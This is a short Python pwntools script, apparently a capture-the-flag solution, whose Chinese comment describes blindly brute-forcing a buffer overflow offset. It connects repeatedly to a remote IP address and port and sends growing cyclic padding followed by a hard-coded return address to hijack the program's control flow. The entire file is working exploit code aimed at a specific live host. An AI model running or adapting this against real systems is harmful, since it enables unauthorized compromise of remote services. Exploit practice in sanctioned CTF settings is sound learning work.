from pwn import *

# context.log_level = 'DEBUG'

# 盲打，爆破缓冲区溢出的位置
for i in range(1000):
    p = remote('61.147.171.105', '63108')
    p.sendlineafter(b'>', cyclic(i) + p64(0x40060d))
    try:
        print(i, p.recv())
    except:
        pass